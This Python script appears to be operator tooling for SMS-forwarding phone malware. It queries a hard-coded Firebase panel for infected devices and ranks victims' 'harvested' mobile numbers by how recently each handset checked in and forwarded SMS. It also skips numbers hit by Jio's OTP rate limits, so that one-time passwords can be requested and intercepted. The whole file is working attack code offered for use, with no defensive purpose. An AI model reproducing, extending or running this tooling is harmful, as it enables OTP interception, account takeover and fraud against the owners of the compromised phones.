#!/usr/bin/env python3
"""pick_fresh.py — rank harvested numbers by how live their device is.

A number is only worth an OTP if the handset that owns it is currently
forwarding SMS to the panel.  Two signals decide that:

  lastSeen  — the device checked in recently (AllData)
  sms age   — the device forwarded an SMS recently (GlobalSms/AllSms)

Numbers that already returned SEND_OTP_CURRENTLY_LOCKED are skipped so we do
not burn attempts on Jio-side rate limits.

Usage:
    python3 pick_fresh.py [--minutes 15] [--top 25]
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent))

from farm import fget, normalize_mobile

DATA = Path(__file__).resolve().parent / "data"
LOCKED_FILE = DATA / "locked_numbers.json"


def load_locked() -> set[str]:
    try:
        return set(json.loads(LOCKED_FILE.read_text()))
    except Exception:
        return set()


def save_locked(nums: set[str]) -> None:
    LOCKED_FILE.write_text(json.dumps(sorted(nums)))


def rank(base: str, minutes: int = 15) -> list[dict]:
    s = requests.Session()
    now = time.time()
    out: list[dict] = []

    data = fget(s, base, "", "AllData", timeout=30)
    if not isinstance(data, dict):
        return out

    # newest sms timestamp per device, from the flat GlobalSms node
    newest_sms: dict[str, float] = {}
    g = fget(s, base, "", "GlobalSms", timeout=30)
    if isinstance(g, dict):
        for k, v in g.items():
            if not isinstance(v, dict):
                continue
            dev = str(v.get("device_id") or "")
            try:
                ts = float(v.get("time") or k) / 1000.0
            except (TypeError, ValueError):
                continue
            if ts > newest_sms.get(dev, 0):
                newest_sms[dev] = ts

    for dev, rec in data.items():
        if not isinstance(rec, dict):
            continue
        mob = normalize_mobile(rec.get("mobile"))
        if not mob:
            continue
        try:
            seen = float(rec.get("lastSeen")) / 1000.0
        except (TypeError, ValueError):
            continue
        sms_ts = newest_sms.get(dev, 0)
        out.append({
            "mobile": mob,
            "device": dev,
            "sim": rec.get("sim_id"),
            "seen_age_min": round((now - seen) / 60, 1),
            "sms_age_min": round((now - sms_ts) / 60, 1) if sms_ts else None,
        })

    out = [r for r in out if r["seen_age_min"] <= minutes]
    out.sort(key=lambda r: (r["sms_age_min"] if r["sms_age_min"] is not None else 1e9,
                            r["seen_age_min"]))
    return out


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="https://gas3-6b801-default-rtdb.firebaseio.com")
    ap.add_argument("--minutes", type=int, default=15)
    ap.add_argument("--top", type=int, default=25)
    args = ap.parse_args()

    locked = load_locked()
    rows = rank(args.base, args.minutes)
    fresh = [r for r in rows if r["mobile"] not in locked]

    print(f"devices seen in last {args.minutes} min: {len(rows)}  "
          f"(locked skipped: {len(rows) - len(fresh)})")
    print()
    print(f"{'mobile':<12} {'seen':>7} {'sms':>7}  {'sim':>3}  device")
    for r in fresh[:args.top]:
        sms = f"{r['sms_age_min']:.1f}m" if r["sms_age_min"] is not None else "  -  "
        print(f"{r['mobile']:<12} {r['seen_age_min']:>6.1f}m {sms:>7}  "
              f"{str(r['sim']):>3}  {r['device'][:16]}")

    (DATA / "fresh_ranked.json").write_text(json.dumps(fresh, indent=1))
    print(f"\n-> data/fresh_ranked.json ({len(fresh)} candidates)")


if __name__ == "__main__":
    main()
